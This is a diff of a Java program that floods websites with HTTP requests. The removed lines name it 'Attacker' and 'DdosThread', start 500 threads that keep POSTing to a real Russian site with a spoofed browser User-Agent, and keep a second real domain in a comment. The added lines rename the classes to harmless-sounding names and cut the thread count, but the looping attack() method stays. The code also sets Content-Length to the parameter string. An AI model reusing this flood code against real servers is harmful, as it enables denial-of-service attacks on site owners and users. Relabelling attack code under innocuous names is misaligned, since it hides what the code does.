@@ -3,28 +3,31 @@ package http;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
 import java.util.concurrent.atomic.AtomicBoolean;
 
-public class Attacker {
+public class SendMultipleHttpRequest {
 
-    public static void main(String... args) throws Exception {
-        for (int i = 0; i < 500; i++) {
-            DdosThread thread = new DdosThread();
+    public static void main(String[] args) throws Exception { // in the pipeline
+
+        for (int i = 0; i < 5; i++) { // 5 http requests to example http
+            MultipleThreadRequest thread = new MultipleThreadRequest();
             thread.start();
         }
+
     }
 
-    public static class DdosThread extends Thread {
+    public static class MultipleThreadRequest extends Thread {
 
         private AtomicBoolean running = new AtomicBoolean(true);
-        private final String request = "https://javarush.ru/api/1.0/rest/me";
+        private final String request = "https://www.igogo.gnom/"; // example http
         private final URL url;
 
         String param = null;
 
-        public DdosThread() throws Exception {
+        public MultipleThreadRequest() throws Exception {
             url = new URL(request);
-            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
+            param = "param1=" + URLEncoder.encode("87845", StandardCharsets.UTF_8);
         }
 
         @Override
@@ -33,7 +36,7 @@ public class Attacker {
                 try {
                     attack();
                 } catch (Exception e) {
-
+                    e.getStackTrace();
                 }
             }
         }
@@ -45,9 +48,8 @@ public class Attacker {
             connection.setRequestMethod("POST");
 //            connection.setRequestProperty("charset", "utf-8");
             connection.setRequestProperty("Host", "localhost");
-//            connection.setRequestProperty("Host", "www.birdam.ru");
+//            connection.setRequestProperty("Host", "https://www.igogo.gnom/");
             connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
-//            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36");
             connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
 //            connection.setRequestProperty("Content-Type", "text/html");
             connection.setRequestProperty("Content-Length", param);
